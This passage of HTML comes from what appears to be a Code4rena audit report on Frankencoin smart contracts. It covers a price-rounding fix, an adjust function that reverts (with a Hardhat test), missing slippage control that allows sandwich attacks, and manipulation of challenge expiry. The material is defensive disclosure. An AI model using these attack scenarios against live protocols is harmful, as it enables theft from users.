viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializeClone</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_limit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mint</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHub</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_mint</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+       </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ( </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_mint</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> ) </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// round up, avoid mintInternal() revert InsufficientCollateral</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/663#issuecomment-1523032872\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Impact seems insignificant<br>\nRounding down just means the price will decrease by a small percentage. Changing this to rounding up might cause a different edge case where an attacker can slightly increase the price by rounding.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/663#issuecomment-1540582813\">hansfriese (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Seems correct. Sponsor review requested.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/663#issuecomment-1554816746\">luziusmeisser (Frankencoin) commented</a>:</strong></p>\n<blockquote>\n<p>Yes, I can confirm this issue. It doesn’t do much harm, but can cause some inconvenience when interacting with the protocol as it only works properly with cleanly divisible amounts for “mint” and “collateral”.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-unable-to-adjust-position-in-some-cases\" style=\"position:relative;\"><a href=\"#m-09-unable-to-adjust-position-in-some-cases\" aria-label=\"m 09 unable to adjust position in some cases permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/454\">[M-09] Unable to adjust position in some cases</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/454\">John</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/942\">4710710N</a></em></p>\n<p>The <code>adjust</code> function in <code>Position.sol</code> is designed to adjust the outstanding amount of ZCHF, the collateral amount, and the price in a single transaction.\nHowever, there are certain cases where this function always reverts.\nAssuming the new price is greater than the current price, if the value of <code>newCollateral</code> is less than <code>colbal</code> or the value of <code>newMinted</code> is greater than <code>minted</code>, the <code>adjust</code> function will always revert with a customized error message reading <code>Hot</code>.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If the value of <code>newPrice</code> is great than value of <code>price</code>, the <code>restrictMinting</code> function is triggered.\nIn this case, if the value of <code>cooldown</code> exceeds <code>block.timestamp</code> + 3 days, <code>cooldown</code> will be update to <code>block.timestamp + 3 days</code>, therefore, both the <code>withdrawCollateral</code> and <code>mint</code> functions will be reverted with custom error because of <code>noCooldown</code> modifier. <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L132-L152\">https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L132-L152</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L159-L167\">https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Position.sol#L159-L167</a></p>\n<p>I will share the test code</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">it(&quot;Will revert adjest tx when newPrice is greater than prevPrice&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let collateral = mockVOL.address;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let fliqPrice = floatToDec18(1000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let minCollateral = floatToDec18(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let fInitialCollateral = floatToDec18(initialCollateral);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let duration = BN.from(14*86_400);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let fFees = BN.from(fee * 1000_000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let fReserve = BN.from(reserve * 1000_000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let openingFeeZCHF = await mintingHubContract.OPENING_FEE();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let challengePeriod = BN.from(7 * 86400); // 7 days</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await mockVOL.connect(accounts[0]).approve(mintingHubContract.address, fInitialCollateral);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let balBefore = await ZCHFContract.balanceOf(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let balBeforeVOL = await mockVOL.balanceOf(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let tx = await mintingHubContract[&quot;openPosition(address,uint256,uint256,uint256,uint256,uint256,uint32,uint256,uint32)&quot;]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (collateral, minCollateral, fInitialCollateral, initialLimit, duration, challengePeriod, fFees, fliqPrice, fReserve);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let rc = await tx.wait();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const topic = &#39;0x591ede549d7e337ac63249acd2d7849532b0a686377bbf0b0cca6c8abd9552f2&#39;; // PositionOpened</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const log = rc.logs.find(x =&gt; x.topics.indexOf(topic) &gt;= 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    positionAddr = log.address;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let balAfter = await ZCHFContract.balanceOf(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let balAfterVOL = await mockVOL.balanceOf(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let dZCHF = dec18ToFloat(balAfter.sub(balBefore));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let dVOL = dec18ToFloat(balAfterVOL.sub(balBeforeVOL));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    expect(dVOL).to.be.equal(-initialCollateral);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    expect(dZCHF).to.be.equal(-dec18ToFloat(openingFeeZCHF));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    positionContract = await ethers.getContractAt(&#39;Position&#39;, positionAddr, accounts[0]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;price:&quot;,await positionContract.price());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;minted:&quot;,await positionContract.minted());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await ethers.provider.send(&#39;evm_increaseTime&#39;, [7 * 86_400 + 60]); </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await ethers.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let erx = positionContract.adjust(1, floatToDec18(8), floatToDec18(1200))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await expect(erx).to.be.revertedWithCustomError(positionContract, &quot;Hot&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;price:&quot;,await positionContract.price());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;minted:&quot;,await positionContract.minted());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>To solve this problem, we can modify the “adjust” function like this;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function adjust(uint256 newMinted, uint256 newCollateral, uint256 newPrice) public onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 colbal = collateralBalance();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (newCollateral &gt; colbal){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        collateral.transferFrom(msg.sender, address(this), newCollateral - colbal);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Must be called after collateral deposit, but before withdrawal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (newMinted &lt; minted){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        zchf.burnFrom(msg.sender, minted - newMinted, reserveContribution);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        minted = newMinted;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (newCollateral &lt; colbal){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        withdrawCollateral(msg.sender, colbal - newCollateral);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Must be called after collateral withdrawal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (newMinted &gt; minted){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        mint(msg.sender, newMinted - minted);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (newPrice != price){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        adjustPrice(newPrice);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/454#issuecomment-1518734040\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Might be a design choice, need sponsor’s input on this one.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/454#issuecomment-1532504703\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>I wouldn’t call this a ‘vulnerability’ but convenience is definitely improved by the recommended mitigation.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-no-slippage-control-when-minting-and-redeeming-fps\" style=\"position:relative;\"><a href=\"#m-10-no-slippage-control-when-minting-and-redeeming-fps\" aria-label=\"m 10 no slippage control when minting and redeeming fps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/396\">[M-10] No slippage control when minting and redeeming FPS</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/396\">cccz</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/983\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/976\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/881\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/877\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/784\">santipu_</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/584\">DishWasher</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/514\">SolidityATL</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/440\">KIntern_NA</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/290\">ToonVH</a></em></p>\n<p>When minting and redeeming FPS in Equity, there is no slippage control. Since the price of FPS will change with the zchf reserve in the contract, users may suffer from sandwich attacks.</p>\n<p>Consider the current contract has a zchf reserve of 1000 and a total supply of 1000.</p>\n<p>Alice considers using 4000 zchf to mint FPS. Under normal circumstances, the contract reserve will rise to 5000 zchf, and the total supply will rise to (5000/1000)**(1/3)*1000 = 1710, that is, alice will get 1710 - 1000 = 710 FPS.</p>\n<p>Bob holds 400 FPS, and bob observes alice’s transaction in MemPool, bob uses MEV to preemptively use 4000 zchf to mint 710 FPS.</p>\n<p>When alice’s transaction is executed, the contract reserve will increase from 5000 to 9000 zchf, and the total supply will increase from 1710 to (9000/5000)**(1/3)*1710 = 2080, that is, alice gets 2080-1710 = 370FPS.</p>\n<p>Then bob will redeem 400 FPS, the total supply will drop from 2080 to 1680, and the contract reserve will drop from 9000 to (1689/2080)**3*9000 = 4742, that is, bob gets 9000-4742 = 4258 zchf.</p>\n<p>Bob’s total profit is 310 FPS and 258 zchf.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L241-L255\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L241-L255</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L266-L270\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L266-L270</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L275-L282\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L275-L282</a> <br><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L290-L297\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L290-L297</a></p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider setting minFPSout and minZCHFout parameters to allow slippage control when minting and redeeming FPS</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/396#issuecomment-1532494762\">luziusmeisser (Frankencoin) confirmed</a>:</strong></p>\n<hr>\n<h2 id=\"m-11-later-challengers-can-bid-on-the-previous-challenge-to-extend-the-expiration-time-of-the-previous-challenge-so-that-their-own-challenge-can-succeed-before-the-previous-challenge-and-get-challenge-rewards\" style=\"position:relative;\"><a href=\"#m-11-later-challengers-can-bid-on-the-previous-challenge-to-extend-the-expiration-time-of-the-previous-challenge-so-that-their-own-challenge-can-succeed-before-the-previous-challenge-and-get-challenge-rewards\" aria-label=\"m 11 later challengers can bid on the previous challenge to extend the expiration time of the previous challenge so that their own challenge can succeed before the previous challenge and get challenge rewards permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/349\">[M-11] Later challengers can bid on the previous challenge to extend the expiration time of the previous challenge, so that their own challenge can succeed before the previous challenge and get challenge rewards</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/349\">cccz</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/308\">RaymondFam</a></em></p>\n<p>When bidders bid, if the expiration time of the challenge is less than 30 minutes, the expiration time will be extended.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">earliestEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">30</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minutes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">earliestEnd</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// bump remaining time like ebay does when last minute bids come in</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// An attacker trying to postpone the challenge forever must increase the bid by 0.5%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// every 30 minutes, or double it every three days, making the attack hard to sustain</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// for a prolonged period of time.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">earliestEnd</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span></code></pre>\n<p>However, extending the expiration time will break the order of the challenges, so that the later challenges will succeed before the previous ones, thus affecting the challenger’s reward expectations.</p>\n<p>Consider the following scenario:</p>\n<ul>\n<li>There is a collateral of 2 WETH in a position, and as the actual price of WETH drops, challengers are attracted to challenge it.</li>\n<li>In block 1, alice uses 2 WETH to challenge the position, and the expiration time is block 7201</li>\n<li>At block 2, bob challenges the position with 2 WETH, expiring at block 7202</li>\n<li>The bidder then bids 4000 ZCHF each for alice’s and bob’s challenges.</li>\n<li>In block 7200, bob finds that if alice’s challenge is successful, then bob will not be able to get the challenge reward, so bob bids 4200 ZCHF to alice’s challenge. Alice’s challenge expiration time is extended to block 7351.</li>\n<li>At block 7201, alice cannot call end to make the challenge successful because the expiration time is extended</li>\n<li>At block 7202, bob successfully calls end to make his challenge successful and gets the challenge reward.</li>\n<li>In block 7351, alice calls the end function. Since the collateral in the position is 0 at this time, alice will not be able to get the challenge reward, and bob’s 4200 zchf will be returned.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notifyChallengeSucceeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHub</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">challengedAmount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">colBal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">collateralBalance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_size</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">colBal</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Challenge is larger than the position. This can for example happen if there are multiple concurrent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// challenges that exceed the collateral 